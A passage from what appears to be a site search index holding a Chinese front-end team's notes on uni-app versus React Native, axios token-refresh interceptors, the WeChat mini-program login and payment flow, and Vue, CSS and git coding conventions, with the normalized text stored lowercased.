log编写指南\n\nTIP\n\n还有一些其他的\n\nbuild：编译相关的修改，例如发布版本、对项目构建或者依赖的改动\n\nci：自动化流程配置修改，例如持续集成脚本的修改\n\nperf：性能优化相关，例如提升性能、体验\n\nrevert：回滚到上一个版本\n\nstyle：代码风格相关，例如不影响代码逻辑的空格、格式、缩进等修改\n\nworkflow：工作流相关的改动，例如增加或者修改自动化流程配置文件等\n\ntest：测试用例相关，例如增加或者修改测试用例\n\n\n# 项目结构\n\n基本的项目结构和文件说明就不说了， /src 路径下的文件得出一些结构\n\nTIP\n\n基本常用的几个\n\nsrc/assets\n\n静态文件存放地址，一般就只是图片文件\n\n/src/components\n\n项目主要组件的文件夹\n\n/src/util\n\n工具函数文件夹，存放项目中使用的工具函数，或者公共变量，公共接口。\n\n/src/router\n\n路由配置项\n\n/src/api\n\n这里主要存放一些接口配置\n\n/src/views\n\n存放逻辑视图代码\n\n/src/store\n\nvuex仓库管理文件\n\n\n# 代码规范\n\n先贴几个业内公认的几个比较好的规范\n\n> 代码规范是为了团队更好的开发制定的规范，其实就是在编辑器里面有更好的可读性，在打包上线之后谁还会看压缩后的代码，一切为了后期的维护和团队其他成员能更好的阅读代码\n\n腾讯团队前端命名规范\n\nAirbnb JS代码规范（中文版传送门）\n\n\n# .vue模版内的html\n\n对于详细的vue代码风格大家可以去看一下官方的风格指南传送门\n\n * 遵循HTML标准实现语义化，但是不应该以浪费实用性作为代价\n\n * 任何时候都要用最小的复杂度和最少的标签来解决问题\n\n * 无语义的装饰元素必须用伪元素来做，不要添加无意义的tag\n\n * 例如：可以用background实现的用background，不允许单独的背景图文件（特殊需求除外），多个背景元素用background+伪元素，伪元素不够再加span 元素内纯装饰性的icon图片，左右箭头，尽量使用伪元素\n\n * 不允许为了设置样式为而去使用带样式的标签，使用标签的唯一目的应该是语义化\n\n * 无内容的标签必须自闭合\n\n * 不允许出现h1，h1的内容放在title标签中，页面内的标题从h2开始。\n\n * 不允许低级标题嵌套高级标题, 例如类似的代码\n\n<h3>\n    <h2></h2>\n</h3>\n\n\n * 对于标签里面的属性值，大于两个的时候要进行换行处理\n\n<statistics-list-item\n    class=\"containerItem\"\n    v-for=\"item in statisticsListToShowWithCondition\"\n    :class=\"{isTotal}\"\n    :style2=\"!isTotal\"\n    :timeStart=\"item.startTime\"\n    :timeEnd=\"item.endTime\"\n    :coverURL=\"item.cover || item.bookCover\"\n    :title=\"item.name || item.bookName\"\n    :finishedCount=\"item.completeCount\"\n    :sumCount=\"item.allCount\"\n    :state=\"item.state\"\n    @goCurrentStatistic=\"goCurrentStatistic(item)\"\n  />\n\n\n * 需要添加副标题的情况下，在<hx>后紧接着使用一个p标签表示副标题\n\n * methods里面的函数一个和一个函数之间要空一行保证解构的清晰(需要标注的函数要在函数的头部进行注释处理)\n\n\n# CSS/LESS/SASS规范\n\n使用小驼峰命名，使用双下划线连接不同部分\n\n<div class=\"chapterStudy-bookReview\">\n    <ul class=\"reviewList-self\"></ul>\n    <ul class=\"reviewList-others\" \x3c!--独立的状态class--\x3e\n        :class=\"{progress, empty, error}\"\n        >\n        <li class=\"reviewItem\" :class=\"{readOnly}\">\n            ...\n        </li>\n    </ul>\n</div>\n\n\ncss属性的可读性编写\n\n参考腾讯的css代码规范\n\n相关的属性声明按右边的顺序做分组处理，组之间需要有一个空行。\n\n基本顺序正确就行，空行是为了可读性\n\n.declaration-order {\n    //div盒子本身的属性\n    display: block;\n    float: right;\n    //div盒子的位置，\n    position: absolute;\n    top: 0;\n    right: 0;\n    bottom: 0;\n    left: 0;\n    z-index: 100;\n    //div盒模型从外到内的尺寸\n    border: 1px solid #e5e5e5;\n    border-radius: 3px;\n    width: 100px;\n    height: 100px;\n    //div内的文本类型属性\n    font: normal 13px \"Helvetica Neue\", sans-serif;\n    line-height: 1.5;\n    text-align: center;\n    //div本身可见区域的属性\n    color: #333;\n    background-color: #f5f5f5;\n    opacity: 1;\n}\n\n\n * 不允许使用id\n\n * 不允许使用标签选择器(以下的vue官方的解释)\n\n * 不允许无意义的选择器嵌套，能够同级使用的类不允许互相嵌套，即使是父子级的关系\n\n * 选择器嵌套不允许超过三层\n\n * 可以通过less class复用的样式必须复用，不允许多次重复\n\n * 全局通用的常量，类必须单独管理引用，不允许重复声明\n\n\n# JS规范\n\nvue组件对象的属性顺序\n\nname,\ncomponents,\nmixins,\nprops,\ndata,\ncomputed,\nwatch,\nfilters,\ndirectives,\nmethods,\nbeforeRouteEnter,\nbeforeRoureUpdate,\nbeforeRouteLeave,\nbeforeCreate,\ncreated,\nbeforeMount,\nmounted,\nbeforeDestroy,\ndestroied\n\n\n * 变量函数使用小驼峰命名，命名必须有含义，不允许使用不明确、随意、或者有歧义的命名\n\n * 与数据状态相关的dom更新必须通过数据控制，不允许直接操作dom。\n\n * 超过一个参数的函数必须使用对象的赋值解构对象赋值解构的解释\n\n * 不允许出现多余的无效的操作\n\n * 组件内手动注册的事件监听/定时器，必须在组件销毁前手动注销\n\n * 对于重复的操作要避免代码的复制，相同的功能可以进行函数的封装\n\n\n# 资源约束\n\n * 可以使用css实现的不允许使用图片\n\n * 所有图片必须压缩\n\n * 同一内容的图片只允许有一张",normalizedContent:"# 项目分享\n\n\n\n * 跨端技术评估 (uniapp reactnative )\n   * 官网地址和介绍\n   * 技术学习成本和难度\n   * 优势劣势\n   * 总结\n * 刷新token实现\n   * 需求解析\n   * 实现思路\n   * 实现\n * 小程序登录\n   * 登录流程时序\n   * unionid 机制说明\n   * 流程开始\n * 微信相关开发常见问题\n   * 微信小程序\n   * 微信公众号\n * css动画集合\n * 前端规范总结\n   * 项目管理\n   * git管理\n   * 项目结构\n   * 代码规范\n   * .vue模版内的html\n   * css/less/sass规范\n   * js规范\n   * 资源约束\n\n\n\n\n# 跨端技术评估 (uniapp reactnative )\n\n\n# 官网地址和介绍\n\nuni-app\n\n> uni-app 是一个使用 vue.js 开发所有前端应用的框架，开发者编写一套代码，可发布到ios、android、web（响应式）、以及各种小程序（微信/支付宝/百度/头条/qq/快手/钉钉/淘宝）、快应用等多个平台。\n\nreactnative\n\n> 使用 react 来创建 android 和 ios 的原生应用\n\n\n# 技术学习成本和难度\n\n * reactnative， react，要求精通flex布局，要求原生开发协作。\n * uni-app，vue，了解小程序。\n\n\n# 优势劣势\n\n# 性能\n\n * uni-app 性能问题存在瓶颈，原生通信受限制，需要根据官方提供间接通信\n * reactnative 性能基本和原生应用无大差别\n\n# 多端\n\n * uni-app 可打包为app(安卓、ios) 小程序 h5 (需要写条件编译)\n * reactnative 只可打包为app(安卓、ios)\n\n# ui\n\n * uni-app 只需要写一套界面ui，就可以适应不同手机的用户\n * reactnative 在ios和android平台上，使用2套ui库\n\n# 生态\n\n * uni-app 全端推送（unipush集成了ios、华为、小米、oppo等众多原厂推送）、各种国内登陆、支付、分享sdk、各种国内地图、各种ui库、以及echart图表等\n * reactnative facebook登陆分享、google地图等\n\n\n# 总结\n\n * uniapp 速度要快一点，学习和开发效率稍高，文档稍乱，多端编译有小bug，小问题较多 或 条件编译处理。\n * reactnative 不支持小程序 h5 等。\n * uniapp 推送 登录 支付 ui库等 生态较好。\n * reactnative 性能高、堪比原生。\n\n> uniapp 开发较小项目较为合适，速度快 但与原生通信通信限制。开发基本的app uniapp封装的api基本够用。\n\n> reactnative 开发效率没有uni-app高、要求懂点原生 但性能较好。\n\n\n# 刷新token实现\n\n> 前端登录后，后端返回token rtoken 当token过期时要求用旧token根据rtoken去获取新的token，前端需要做到无痛刷新token，即请求刷新token时要做到用户无感知。\n\n\n# 需求解析\n\n当用户发起一个请求时，判断token是否已过期，若已过期则先调refresh接口，拿到新的token后再继续执行之前的请求。 这个问题的难点在于：当同时发起多个请求，而刷新token的接口还没返回，此时其他请求该如何处理？\n\n\n# 实现思路\n\n * 方法一：\n   \n   在请求发起前拦截每个请求，判断token的有效时间是否已经过期，若已过期，则将请求挂起，先刷新token后再继续请求。\n   \n   * 优点： 在请求前拦截，能节省请求，省流量。\n   * 缺点： 需要后端额外提供一个token过期时间的字段；使用了本地时间判断，若本地时间被篡改，特别是本地时间比服务器时间慢时，拦截会失败。\n\ntip\n\ntoken有效时间建议是时间段，类似缓存的maxage，而不要是绝对时间。当服务器和本地时间不一致时，绝对时间会有问题。\n\n * 方法二：\n   \n   不在请求前拦截，而是拦截返回后的数据。先发起请求，接口返回过期后，先刷新token，再进行一次重试\n   \n   * 优点：不需额外的token过期字段，不需判断时间。\n   * 缺点： 会消耗多一次请求，耗流量。\n\n\n# 实现\n\n# 先看一道面试题\n\nconsole.log('start')\n\nsettimeout(() => {\n    console.log('settimeout')\n}, 0)\n\nnew promise((resolve) => {\n        console.log('promise')\n        resolve()\n    })\n    .then(() => {\n        console.log('then1')\n    })\n    .then(() => {\n        console.log('then2')\n    })\n\nconsole.log('end')\n\n输出为\nstart\npromise\nend\nthen1\nthen2\nsettimeout\n\n\n# promise对象有以下两个特点。\n\n（1）对象的状态不受外界影响。promise对象代表一个异步操作，有三种状态：pending（进行中）、fulfilled（已成功）和rejected（已失败）。只有异步操作的结果，可以决定当前是哪一种状态，任何其他操作都无法改变这个状态。这也是promise这个名字的由来，它的英语意思就是“承诺”，表示其他手段无法改变。\n\n（2）一旦状态改变，就不会再变，任何时候都可以得到这个结果。promise对象的状态改变，只有两种可能：从pending变为fulfilled和从pending变为rejected。只要这两种情况发生，状态就凝固了，不会再变了，会一直保持这个结果，这时就称为 resolved（已定型）。如果改变已经发生了，你再对promise对象添加回调函数，也会立即得到这个结果。这与事件（event）完全不同，事件的特点是，如果你错过了它，再去监听，是得不到结果的。\n\n# 代码实现\n\nlet isrefreshing = false // 标记是否正在刷新 token 避免重新请求\nlet requests = [] // 存储待重发请求的数组\n\n//httpresponse拦截\naxios.interceptors.response.use(res => {\n    nprogress.done();\n    const status = number(res.status) || 200;\n    const statuswhitelist = website.statuswhitelist || [];\n    const message = res.data.message || '未知错误';\n    //如果在白名单里则自行catch逻辑处理\n    if (statuswhitelist.includes(status)) return promise.reject(res);\n    //如果是401则跳转到登录页面\n    if (status === 401 && res.data.code === 401) {\n        if (res.data.message == 'token无效') {\n            let {\n                r_token\n            } = gettoken();\n            let reftokenmethods = new reftokenrreq(res.config, r_token);\n            return reftokenmethods.reftokenrreq();\n        } else {\n            store.dispatch('fedlogout').then(() => router.push({\n                path: '/login'\n            }));\n        }\n    }\n    // 如果请求为非200否者默认统一处理\n    if (status !== 200) {\n        message({\n            message: message,\n            type: 'error'\n        })\n        return promise.reject(new error(message))\n    }\n    return res;\n}, error => {\n    nprogress.done();\n    return promise.reject(new error(error));\n})\n\nclass reftokenrreq {\n    constructor(config, r_token) {\n        this.config = config;\n        this.r_token = r_token;\n    }\n    //重复执行请求操作\n    repeatrequest({\n        url,\n        method,\n        data,\n        params,\n        headers\n    }) {\n        return axios({\n            headers,\n            url,\n            method,\n            data,\n            params\n        })\n    }\n    // 刷新token 请求\n    reftokenrreq() {\n        if (!isrefreshing) {\n            isrefreshing = true\n            return reftoken(this.r_token).then((res) => {\n                    if (res.data.code == 200) {\n                        store.commit('set_token', res.data.data);\n                        requests.foreach((cb) => cb());\n                        requests = [] // 重新请求完清空\n                        return this.repeatrequest(this.config)\n                    } else {\n                        store.dispatch('fedlogout').then(() => router.push({\n                            path: '/login'\n                        }));\n                    }\n                })\n                .finally(() => {\n                    // 设置请求是否成功设置为false\n                    isrefreshing = false\n                })\n        } else {\n            // 返回未执行 resolve 的 promise\n            return new promise(resolve => {\n                // 用函数形式将 resolve 存入，等待刷新后再执行\n                requests.push(() => {\n                    resolve(this.repeatrequest(this.config))\n                })\n            })\n        }\n    }\n\n}\n\n\n\n# 小程序登录\n\n> 小程序可以通过微信官方提供的登录能力方便地获取微信提供的用户身份标识，快速建立小程序内的用户体系。\n\n\n# 登录流程时序\n\nwarning\n\n会话密钥 session_key 是对用户数据进行 加密签名 的密钥。为了应用自身的数据安全，开发者服务器不应该把会话密钥下发到小程序，也不应该对外提供这个密钥。 临时登录凭证 code 只能使用一次\n\n\n\n\n# unionid 机制说明\n\n> 如果开发者拥有多个移动应用、网站应用、和公众帐号（包括小程序），可通过 unionid 来区分用户的唯一性，因为只要是同一个微信开放平台帐号下的移动应用、网站应用和公众帐号（包括小程序），用户的 unionid 是唯一的。换句话说，同一用户，对同一个微信开放平台下的不同应用，unionid是相同的。\n\n\n# 流程开始\n\n小程序登录 用户信息相关接口已在 2021年4月 已做出跳转，具体点击 link\n\n\n\n登录逻辑\n\n 1. 用户第一次登录 （旧逻辑）\n\n * 弹窗是否同意授权（调取接口获取是否已有注册）\n * 调用手机手机号授权直接注册登录、\n\n 1. 用户第一次登录 （新逻辑）\n\n * 调用login 登录后直接获取code 如果失败后获取后台给的unionid 通过手机号注册并登录（需要注意login 获取的code 是否过期 避免重复请求和 session_key 对应不上）\n\n 2. 用户不是第一次登录。共同逻辑\n\n * 本地有token 并且rtoken 未过期的情况直接换rtoken。\n * 本地有token rtoken token 都过期的情况 判断rtoken 刷新失败 跳到我的页面，用户点击登录。\n * 本地没有token 重复第一步 检测用户授权后登录\n\n一. 调用wx.login生成code （如果是老用户 直接登录成功）\n\n// 微信授权登录 封装\nexport const loginbyopenid = () => {\n    return new promise((resolve, reject) => {\n        // https://developers.weixin.qq.com/community/develop/doc/000cacfa20ce88df04cb468bc52801\n        uni.login({\n            success(login) {\n                // login 返回 并存下 是因为 避免新用户进来 又不注册的特殊情况。（因为login 的 code 是有时间限制的）\n                const code = login.code;\n                uni.setstoragesync('code', code);\n                //整合数据请求登录 \n                /*\n                wxlogin 接口是服务端 根据 code 以及小程序的 appid secret  grant_type 获取 unionid  和  session_key\n                unionid 是 唯一的  可在数据库中查询出 用户是否存在 \n                    存在    生成token 直接返回前端并登录\n                    不存在  证明用户未登录 返回特殊编码（后续使用202判断）\n                */\n                wxlogin('/mall-cloud-system/authservice/xcxloginbyunionid', {\n                    code\n                }).then(res => {\n                    resolve(res)\n                }).catch((erro) => {\n                    reject(erro)\n                })\n            },\n            fail(erro) {\n                reject(erro)\n            }\n        })\n    })\n}\n// loginbyopenid 方法调用\nloginbyopenid().then(res => {\n    //  这里的 promise 返回 请求 wxlogin 接口的数据\n    if (res.code == 200) {\n        // 如果200了 证明 login.code 正确 是老用户 并返回了token\n        uni.showtoast({\n            title: '登录成功',\n            icon: 'none'\n        })\n        //登录成功\n        const token = {\n                a_token: res.data.a_token,\n                r_token: res.data.r_token,\n            }\n            ......\n    } else if (res.code == 202) {\n        // 如果是202（可与后台协商为注册的信息） 把当前用户唯一的 unionid 存下来 后续手机号 注册登录 需要参数\n        const unid = res.data;\n        uni.setstoragesync('unionid', unid);\n        // 这里后续应弹出 授权 用户信息  和 手机号 方法 \n        ......\n    } else if (res.code == 500) {\n        uni.showtoast({\n            title: res.message,\n            icon: 'none'\n        })\n    }\n}).catch(error => {\n    uni.showtoast({\n        title: '登录失败，请重新登录!',\n        icon: 'none'\n    })\n})\n\n\n二、wx.getuserprofile 获取用户资料 和 button 组件 open-type=\"getphonenumber\" 获取手机号。 （获取用户资料 和手 机号 顺序可根据需求自定义）\n\nwarning\n\ngetuserprofile 获取用户信息。页面产生点击事件后才可调用，每次请求都会弹出授权窗口，用户同意后返回 userinfo. 该接口用于替换 wx.getuserinfo\n\ngetphonenumber 需要将 button 组件 open-type 的值设置为 getphonenumber，当用户点击并同意之后，可以通过 bindgetphonenumber 事件回调获取到微信服务器返回的加密数据， 然后在第三方服务端结合 session_key 以及 app_id 进行解密获取手机号。\n\n在回调中调用 wx.login 登录，可能会刷新登录态。此时服务器使用 code 换取的 sessionkey 不是加密时使用的 sessionkey，导致解密失败。建议开发者提前进行 login；或者在回调中先使用 checksession 进行登录态检查，避免 login 刷新登录态。\n\nchecksession 检查登录态是否过期。 通过 wx.login 接口获得的用户登录态拥有一定的时效性。用户越久未使用小程序，用户登录态越有可能失效。反之如果用户一直在使用小程序，则用户登录态一直保持有效。具体时效逻辑由微信维护，对开发者透明。开发者只需要调用 wx.checksession 接口检测当前用户登录态是否有效。\n\n登录态过期后开发者可以再调用 wx.login 获取新的用户登录态。调用成功说明当前 session_key 未过期，调用失败说明 session_key 已过期。更多使用方法详见 小程序登录。\n\n<u-button type=\"primary\" @click=\"getuserinfo\">使用微信授权登录</u-button>\n\n<u-button open-type=\"getphonenumber\" type=\"primary\" @getphonenumber=\"getphonenumber\">授权手机号登录</u-button>\n\n\n// 用户首次登录\t loginbyopenid 失败后处理的\nexport const loginbymobile = (callback) => {\n    function mobilefun(code) {\n        // 后台返回的unionid\n        let unionid = uni.getstoragesync('unionid');\n        // 获取手机获得的\n        let iv = uni.getstoragesync('cashiv');\n        let encrypteddata = uni.getstoragesync('cashencrypteddata');\n        let userprofile = uni.getstoragesync('userprofile');\n        // xcxloginbymobile 接口 向后台传参 解密手机号的字段 和 当前用户的资料 \n        wxlogin('/mall-cloud-system/authservice/xcxloginbymobile', {\n            unionid,\n            iv,\n            encrypteddata,\n            code,\n            ...userprofile\n        }).then(res => {\n            // 在参数回调 中传入 接口成功 或 失败 后的处理 \n            callback(res)\n        }).catch((res) => {\n            callback(res)\n        })\n    }\n    // 这个方法用于检测 检查登录态是否过期\n    uni.checksession({\n        success(res) {\n            // 没有过期的话 证明 存在的的code 可直接使用\n            console.log(res, '没有过期')\n            //session_key 未过期，并且在本生命周期一直有效\n            let code = uni.getstoragesync('code');\n            mobilefun(code)\n        },\n        fail(res) {\n            console.log(res, '已过期')\n            // session_key 已经失效，需要重新执行登录流程 获取code\n            uni.login({\n                success(res) {\n                    mobilefun(res.code)\n                },\n                fail() {\n                    uni.showtoast({\n                        title: '登录失败，请重试！',\n                        icon: 'none'\n                    })\n                }\n            })\n        }\n    })\n}\n\n// getuserprofile 获取用户资料 头像 昵称 性别 等信息\ngetuserinfo(res) {\n    uni.getuserprofile({\n        desc: '登录同步数据',\n        success: (res) => {\n            // 这里成功获取后 把用户信息存下来 调取手机号登录\n            uni.setstoragesync('userprofile', res.userinfo);\n        },\n        fail: (res) => {\n            console.log(res)\n            uni.showtoast({\n                title: '授权失败!',\n                icon: 'none'\n            })\n        }\n    })\n}\n\n// 用户手机号登录\ngetphonenumber(res) {\n    if (res.detail.errmsg == \"getphonenumber:fail user deny\") {\n        uni.showtoast({\n            title: '授权失败!',\n            icon: 'none'\n        })\n        return;\n    } else {\n        //用户同意授权手机号\n        //    iv 加密算法的初始向量，详细见加密数据解密算法\n        uni.setstoragesync('cashiv', res.detail.iv);\n        //    encrypteddata  包括敏感数据在内的完整用户信息的加密数据，详细见加密数据解密算法\n        uni.setstoragesync('cashencrypteddata', res.detail.encrypteddata);\n        loginbymobile(res => {\n            if (res.code == 200) {\n                uni.showtoast({\n                    title: '登录成功',\n                    icon: 'none'\n                })\n                this.show = false;\n                //登录成功\n                //登录成功\n                let token = {\n                        a_token: res.data.a_token,\n                        r_token: res.data.r_token,\n                    }\n                    ......\n            } else {\n                uni.showtoast({\n                    title: '登录失败，请重试！',\n                    icon: 'none'\n                })\n            }\n        })\n    }\n}\n\n\n\n# 微信相关开发常见问题\n\n\n# 微信小程序\n\n# 项目架构设置\n\nwarning\n\n合理使用分包加载\n\n> 整个小程序所有分包大小不超过 20m 单个分包/主包大小不能超过 2m\n\n * 承载更多功能：小程序单个代码包的体积上限为 2m，使用分包可以提升小程序代码包总体积上限，承载更多的功能与服务。\n * 降低代码包下载耗时：使用分包后可以显著减少启动时需要下载的代码包大小，在不影响功能正常使用的前提下，有效降低启动耗时。\n * 降低小程序代码注入耗时：若未开启按需注入，小程序编译时会将所有 js 文件打包成同一个文件一次性的注入，并执行所有页面和自定义组件的代码。分包后可以降低注入和实际执行的代码量，从而降低注入耗时。\n * 降低页面渲染耗时：使用分包可以避免不必要的组件和页面初始化。\n * 降低内存占用：分包能够实现页面、组件和逻辑较粗粒度的按需加载，从而降低内存的占用。 此外，结合分包加载的几个扩展功能，可以进一步优化启动耗时\n\n避免非必要的全局自定义组件和插件\n\n> 如果不是公共组件 避免放入全局组件中。如果插件只在某个分包的中使用，请仅在分包中引用插件。\n\n控制代码包内的资源文件\n\n> 开发中的静态资源（静态图片、静态文件）尽量使用cdn , 例如阿里云oss。\n\n# 支付 文档\n\nwarning\n\n> wx.requestpayment(object object) 需要注意后端返回的支付参数 大小写问题。必须和文档种的key值一一对应。\n\n# 登录授权 - 文档\n\n# 其他开放能力相关文档\n\n# 其他细节问题\n\n * 使用uniapp开发，uni.previewimage会导致触发app.vue的onshow方法。\n * 使用web-view 指向网页的链接。可打开关联的公众号的文章，其它网页需登录小程序管理后台配置业务域名。\n * 体验者小程序 需要 打开开发调试 才能访问业务域名之外的接口，比如本地调试接口。\n\n\n# 微信公众号\n\n# 网页授权 文档\n\nwarning\n\n需要配置业务域名和更目录验证文件。\n\n# js-sdk 开发能力 文档\n\nwarning\n\n微信公众号的开放能力 需要统一引用、使用。 例如：\n\nwx.config({\n    debug: true, // 开启调试模式,调用的所有api的返回值会在客户端alert出来，若要查看传入的参数，可以在pc端打开，参数信息会通过log打出，仅在pc端时才会打印。\n    appid: '', // 必填，公众号的唯一标识\n    timestamp: , // 必填，生成签名的时间戳\n    noncestr: '', // 必填，生成签名的随机串\n    signature: '', // 必填，签名\n    jsapilist: [] // 必填，需要使用的js接口列表\n});\n\n\n之前微信公众号暴露的方法 在文档中不体现。但是还可以继续使用。例如支付方法\n\nwindow.weixinjsbridge.invoke(\n    'getbrandwcpayrequest',\n    paydata,\n    (res) => {\n        // 成功\n        if (res.err_msg == 'get_brand_wcpay_request:ok') {\n            uni.$u.toast('支付成功!');\n            uni.relaunch({\n                url: '/pages/paysuccess/index',\n            });\n            // 失败\n        } else if (res.err_msg == 'get_brand_wcpay_request:cancel') {\n            // toast('支付失败!')\n            uni.$u.toast('取消支付!');\n        }\n    },\n    (err) => {\n        uni.$u.toast('支付失败!');\n    }\n);\n\n\n目前公众号v3支付成功后 不允许跳转到自定义页面了。只能关闭或者跳转微信自己的配置页面 相关文档\n\n\n# css动画集合\n\n * https://lhammer.cn/you-need-to-know-css/#/zh-cn/\n\n * https://chokcoco.github.io/css-inspiration/#/\n\n * https://qishaoxuan.github.io/css_tricks/\n\n * https://tobiasahlin.com/spinkit/\n\n * https://animista.net/\n\n * https://animate.style/\n\n * http://ianlunn.github.io/hover/\n\n * http://kristofferandreasen.github.io/wickedcss/#\n\n * https://angrytools.com/css/animation/\n\n * https://elrumordelaluz.github.io/csshake/\n\n\n# 前端规范总结\n\n\n# 项目管理\n\n# 项目介绍文件(readme.md文件)\n\ntip\n\n# 最佳实践\n\n助产空间后台管理\n\n\n## project setup\n\nnpm install\n\n### compiles and hot-reloads for development\n\nnpm run serve\n\n### compiles and minifies for production (生产环境 build)\n\nnpm run build\n\n### compiles and minifies for uat (uat环境 build)\n\nnpm run uat\n\n### compiles and minifies for test (test环境 build)\n\nnpm run test\n\n### lints and fixes files\n\nnpm run lint\n\n### run your unit tests\n\nnpm run test:unit\n\n### run your end-to-end tests\n\nnpm run test:e2e\n\n\n\n# git管理\n\n# 分支管理\n\n每一个项目的分支都有两个基本分支 master (项目介绍文件)和 dev (开发分支)\n\n * master分支在项目创建之初只是起到介绍的作用，不再进行修改。\n\n * dev分支是项目的开发分支，由负责人管理，在每次团队其他成员写了新的功能，由负责人进行分支合并和功能合并.\n\n * 版本上线dev合并到master。版本迭代从master迁移 ，如：由1.0-> dev2.0 dev3.0\n\n# git commit规范\n\n> commit是为了每次提交都有相关的描述文字来解释每次提交的代码，为了其他成员能更好的看懂代码，更好的规范还是很有必要的。\n\n代码提交的话最好是每天都进行提交，能看到你每天完成了什么\n\ngit提交推荐使用git官方的桌面应用github desktop（更好的代码可视化和不再使用单一的命令行）\n\ntip\n\n基本常用的几个\n\nfeat：新功能（feature）\n\nfix：修补bug\n\ndocs：文档（documentation）\n\nstyle： 格式（不影响代码运行的变动）\n\nrefactor：重构（即不是新增功能，也不是修改bug的代码变动）\n\ntest：增加测试\n\nchore：构建过程或辅助工具的变动\n\n细的介绍在阮一峰大佬的commit message和change log编写指南\n\ntip\n\n还有一些其他的\n\nbuild：编译相关的修改，例如发布版本、对项目构建或者依赖的改动\n\nci：自动化流程配置修改，例如持续集成脚本的修改\n\nperf：性能优化相关，例如提升性能、体验\n\nrevert：回滚到上一个版本\n\nstyle：代码风格相关，例如不影响代码逻辑的空格、格式、缩进等修改\n\nworkflow：工作流相关的改动，例如增加或者修改自动化流程配置文件等\n\ntest：测试用例相关，例如增加或者修改测试用例\n\n\n# 项目结构\n\n基本的项目结构和文件说明就不说了， /src 路径下的文件得出一些结构\n\ntip\n\n基本常用的几个\n\nsrc/assets\n\n静态文件存放地址，一般就只是图片文件\n\n/src/components\n\n项目主要组件的文件夹\n\n/src/util\n\n工具函数文件夹，存放项目中使用的工具函数，或者公共变量，公共接口。\n\n/src/router\n\n路由配置项\n\n/src/api\n\n这里主要存放一些接口配置\n\n/src/views\n\n存放逻辑视图代码\n\n/src/store\n\nvuex仓库管理文件\n\n\n# 代码规范\n\n先贴几个业内公认的几个比较好的规范\n\n> 代码规范是为了团队更好的开发制定的规范，其实就是在编辑器里面有更好的可读性，在打包上线之后谁还会看压缩后的代码，一切为了后期的维护和团队其他成员能更好的阅读代码\n\n腾讯团队前端命名规范\n\nairbnb js代码规范（中文版传送门）\n\n\n# .vue模版内的html\n\n对于详细的vue代码风格大家可以去看一下官方的风格指南传送门\n\n * 遵循html标准实现语义化，但是不应该以浪费实用性作为代价\n\n * 任何时候都要用最小的复杂度和最少的标签来解决问题\n\n * 无语义的装饰元素必须用伪元素来做，不要添加无意义的tag\n\n * 例如：可以用background实现的用background，不允许单独的背景图文件（特殊需求除外），多个背景元素用background+伪元素，伪元素不够再加span 元素内纯装饰性的icon图片，左右箭头，尽量使用伪元素\n\n * 不允许为了设置样式为而去使用带样式的标签，使用标签的唯一目的应该是语义化\n\n * 无内容的标签必须自闭合\n\n * 不允许出现h1，h1的内容放在title标签中，页面内的标题从h2开始。\n\n * 不允许低级标题嵌套高级标题, 例如类似的代码\n\n<h3>\n    <h2></h2>\n</h3>\n\n\n * 对于标签里面的属性值，大于两个的时候要进行换行处理\n\n<statistics-list-item\n    class=\"containeritem\"\n    v-for=\"item in statisticslisttoshowwithcondition\"\n    :class=\"{istotal}\"\n    :style2=\"!istotal\"\n    :timestart=\"item.starttime\"\n    :timeend=\"item.endtime\"\n    :coverurl=\"item.cover || item.bookcover\"\n    :title=\"item.name || item.bookname\"\n    :finishedcount=\"item.completecount\"\n    :sumcount=\"item.allcount\"\n    :state=\"item.state\"\n    @gocurrentstatistic=\"gocurrentstatistic(item)\"\n  />\n\n\n * 需要添加副标题的情况下，在<hx>后紧接着使用一个p标签表示副标题\n\n * methods里面的函数一个和一个函数之间要空一行保证解构的清晰(需要标注的函数要在函数的头部进行注释处理)\n\n\n# css/less/sass规范\n\n使用小驼峰命名，使用双下划线连接不同部分\n\n<div class=\"chapterstudy-bookreview\">\n    <ul class=\"reviewlist-self\"></ul>\n    <ul class=\"reviewlist-others\" \x3c!--独立的状态class--\x3e\n        :class=\"{progress, empty, error}\"\n        >\n        <li class=\"reviewitem\" :class=\"{readonly}\">\n            ...\n        </li>\n    </ul>\n</div>\n\n\ncss属性的可读性编写\n\n参考腾讯的css代码规范\n\n相关的属性声明按右边的顺序做分组处理，组之间需要有一个空行。\n\n基本顺序正确就行，空行是为了可读性\n\n.declaration-order {\n    //div盒子本身的属性\n    display: block;\n    float: right;\n    //div盒子的位置，\n    position: absolute;\n    top: 0;\n    right: 0;\n    bottom: 0;\n    left: 0;\n    z-index: 100;\n    //div盒模型从外到内的尺寸\n    border: 1px solid #e5e5e5;\n    border-radius: 3px;\n    width: 100px;\n    height: 100px;\n    //div内的文本类型属性\n    font: normal 13px \"helvetica neue\", sans-serif;\n    line-height: 1.5;\n    text-align: center;\n    //div本身可见区域的属性\n    color: #333;\n    background-color: #f5f5f5;\n    opacity: 1;\n}\n\n\n * 不允许使用id\n\n * 不允许使用标签选择器(以下的vue官方的解释)\n\n * 不允许无意义的选择器嵌套，能够同级使用的类不允许互相嵌套，即使是父子级的关系\n\n * 选择器嵌套不允许超过三层\n\n * 可以通过less class复用的样式必须复用，不允许多次重复\n\n * 全局通用的常量，类必须单独管理引用，不允许重复声明\n\n\n# js规范\n\nvue组件对象的属性顺序\n\nname,\ncomponents,\nmixins,\nprops,\ndata,\ncomputed,\nwatch,\nfilters,\ndirectives,\nmethods,\nbeforerouteenter,\nbeforeroureupdate,\nbeforerouteleave,\nbeforecreate,\ncreated,\nbeforemount,\nmounted,\nbeforedestroy,\ndestroied\n\n\n * 变量函数使用小驼峰命名，命名必须有含义，不允许使用不明确、随意、或者有歧义的命名\n\n * 与数据状态相关的dom更新必须通过数据控制，不允许直接操作dom。\n\n * 超过一个参数的函数必须使用对象的赋值解构对象赋值解构的解释\n\n * 不允许出现多余的无效的操作\n\n * 组件内手动注册的事件监听/定时器，必须在组件销毁前手动注销\n\n * 对于重复的操作要避免代码的复制，相同的功能可以进行函数的封装\n\n\n# 资源约束\n\n * 可以使用css实现的不允许使用图片\n\n * 所有图片必须压缩\n\n * 